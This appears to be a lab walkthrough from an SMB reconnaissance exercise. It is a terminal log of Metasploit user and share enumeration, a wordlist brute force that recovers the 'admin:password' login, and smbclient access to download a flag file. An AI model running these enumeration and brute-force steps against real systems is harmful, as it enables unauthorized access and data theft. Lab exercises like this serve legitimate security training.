Identifying the target:

[[ip]]
```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
14246: eth0@if14247: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.4/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
14249: eth1@if14250: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:b5:f1:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.181.241.2/24 brd 192.181.241.255 scope global eth1
       valid_lft forever preferred_lft forever
```
[[ifconfig]]
```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.4  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:04  txqueuelen 0  (Ethernet)
        RX packets 134  bytes 11802 (11.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 106  bytes 313876 (306.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.181.241.2  netmask 255.255.255.0  broadcast 192.181.241.255
        ether 02:42:c0:b5:f1:02  txqueuelen 0  (Ethernet)
        RX packets 58  bytes 7108 (6.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

[[ping]]
```
root@attackdefense:~# ping -c 5 192.181.241.3
PING 192.181.241.3 (192.181.241.3) 56(84) bytes of data.
64 bytes from 192.181.241.3: icmp_seq=1 ttl=64 time=0.100 ms
64 bytes from 192.181.241.3: icmp_seq=2 ttl=64 time=0.020 ms
64 bytes from 192.181.241.3: icmp_seq=3 ttl=64 time=0.021 ms
64 bytes from 192.181.241.3: icmp_seq=4 ttl=64 time=0.020 ms
64 bytes from 192.181.241.3: icmp_seq=5 ttl=64 time=0.020 ms

--- 192.181.241.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 99ms
rtt min/avg/max/mdev = 0.020/0.036/0.100/0.032 ms
root@attackdefense:~#
```

[[metasploit]]

```
root@attackdefense:~# service postgresql start && msfconsole
[ ok ] Starting PostgreSQL 11 database server: main.

       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 >
```


```
msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > search type:auxiliary name:smb

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank    Check  Description
   -   ----                                                        ---------------  ----    -----  -----------
   1   auxiliary/admin/oracle/ora_ntlm_stealer                     2009-04-07       normal  No     Oracle SMB Relay Code Execution
   2   auxiliary/admin/smb/check_dir_file                                           normal  Yes    SMB Scanner Check File/Directory Utility
   3   auxiliary/admin/smb/delete_file                                              normal  Yes    SMB File Delete Utility
   4   auxiliary/admin/smb/download_file                                            normal  Yes    SMB File Download Utility
   5   auxiliary/admin/smb/list_directory                                           normal  No     SMB Directory Listing Utility
   6   auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   7   auxiliary/admin/smb/upload_file                                              normal  Yes    SMB File Upload Utility
   8   auxiliary/dos/smb/smb_loris                                 2017-06-29       normal  No     SMBLoris NBSS Denial of Service
   9   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                    normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   10  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                       normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   11  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                   normal  No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   12  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                     normal  No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   13  auxiliary/dos/windows/smb/vista_negotiate_stop                               normal  No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   14  auxiliary/fileformat/multidrop                                               normal  No     Windows SMB Multi Dropper
   15  auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                 normal  No     SMB Negotiate SMB2 Dialect Corruption
   16  auxiliary/fuzzers/smb/smb_create_pipe                                        normal  No     SMB Create Pipe Request Fuzzer
   17  auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                normal  No     SMB Create Pipe Request Corruption
   18  auxiliary/fuzzers/smb/smb_negotiate_corrupt                                  normal  No     SMB Negotiate Dialect Corruption
   19  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                normal  No     SMB NTLMv1 Login Request Corruption
   20  auxiliary/fuzzers/smb/smb_tree_connect                                       normal  No     SMB Tree Connect Request Fuzzer
   21  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                               normal  No     SMB Tree Connect Request Corruption
   22  auxiliary/scanner/sap/sap_smb_relay                                          normal  Yes    SAP SMB Relay Abuse
   23  auxiliary/scanner/smb/pipe_auditor                                           normal  Yes    SMB Session Pipe Auditor
   24  auxiliary/scanner/smb/pipe_dcerpc_auditor                                    normal  Yes    SMB Session Pipe DCERPC Auditor
   25  auxiliary/scanner/smb/smb1                                                   normal  Yes    SMBv1 Protocol Detection
   26  auxiliary/scanner/smb/smb2                                                   normal  Yes    SMB 2.0 Protocol Detection
   27  auxiliary/scanner/smb/smb_enum_gpp                                           normal  Yes    SMB Group Policy Preference Saved Passwords Enumeration
   28  auxiliary/scanner/smb/smb_enumshares                                         normal  Yes    SMB Share Enumeration
   29  auxiliary/scanner/smb/smb_enumusers                                          normal  Yes    SMB User Enumeration (SAM EnumUsers)
   30  auxiliary/scanner/smb/smb_enumusers_domain                                   normal  Yes    SMB Domain User Enumeration
   31  auxiliary/scanner/smb/smb_login                                              normal  Yes    SMB Login Check Scanner
   32  auxiliary/scanner/smb/smb_lookupsid                                          normal  Yes    SMB SID User Enumeration (LookupSid)
   33  auxiliary/scanner/smb/smb_ms17_010                                           normal  Yes    MS17-010 SMB RCE Detection
   34  auxiliary/scanner/smb/smb_version                                            normal  Yes    SMB Version Detection
   35  auxiliary/scanner/snmp/snmp_enumshares                                       normal  Yes    SNMP Windows SMB Share Enumeration
   36  auxiliary/server/capture/smb                                                 normal  No     Authentication Capture: SMB


msf5 > workspace -a smb_enum
[*] Added workspace: smb_enum
[*] Workspace: smb_enum
msf5 > setg rhosts 192.181.241.3
rhosts => 192.181.241.3
msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.181.241.3    yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.181.241.3:445     - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] 192.181.241.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumusers
msf5 auxiliary(scanner/smb/smb_enumusers) > options

Module options (auxiliary/scanner/smb/smb_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.181.241.3    yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_enumusers) > run

[+] 192.181.241.3:139     - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
[*] 192.181.241.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_enumusers) > use auxiliary/scanner/smb/smb_enumshares
msf5 auxiliary(scanner/smb/smb_enumshares) > run

[+] 192.181.241.3:139     - public - (DS) 
[+] 192.181.241.3:139     - john - (DS) 
[+] 192.181.241.3:139     - aisha - (DS) 
[+] 192.181.241.3:139     - emma - (DS) 
[+] 192.181.241.3:139     - everyone - (DS) 
[+] 192.181.241.3:139     - IPC$ - (I) IPC Service (samba.recon.lab)
[*] 192.181.241.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target address range or CIDR identifier
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set rhosts 192.181.241.3
rhosts => 192.181.241.3
msf5 auxiliary(scanner/smb/smb_login) > set smbuser admin
smbuser => admin
msf5 auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 192.181.241.3:445     - 192.181.241.3:445 - Starting SMB login bruteforce
[-] 192.181.241.3:445     - 192.181.241.3:445 - Failed: '.\admin:admin',
[-] 192.181.241.3:445     - 192.181.241.3:445 - Failed: '.\admin:123456',
[-] 192.181.241.3:445     - 192.181.241.3:445 - Failed: '.\admin:12345',
[-] 192.181.241.3:445     - 192.181.241.3:445 - Failed: '.\admin:123456789',
[+] 192.181.241.3:445     - 192.181.241.3:445 - Success: '.\admin:password'
[*] 192.181.241.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) > exit
root@attackdefense:~# smbclient -L \\\\192.181.241.3\\ -U admin 
Enter WORKGROUP\admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
root@attackdefense:~# smbclient -L \\\\192.181.241.3\\public -U admin 
Enter WORKGROUP\admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
root@attackdefense:~# smbclient \\\\192.181.241.3\\public -U admin 
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  secret                              D        0  Tue Nov 27 13:36:13 2018
  dev                                 D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 221885916 blocks available
smb: \> cd secret\
smb: \secret\> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  flag                                N       33  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 221886012 blocks available
smb: \secret\> get flag 
getting file \secret\flag of size 33 as flag (330000.0 KiloBytes/sec) (average inf KiloBytes/sec)
smb: \secret\> exit
root@attackdefense:~# ls
README  flag  tools  wordlists
root@attackdefense:~# cat flag 
03ddb97933e716f5057a1863
```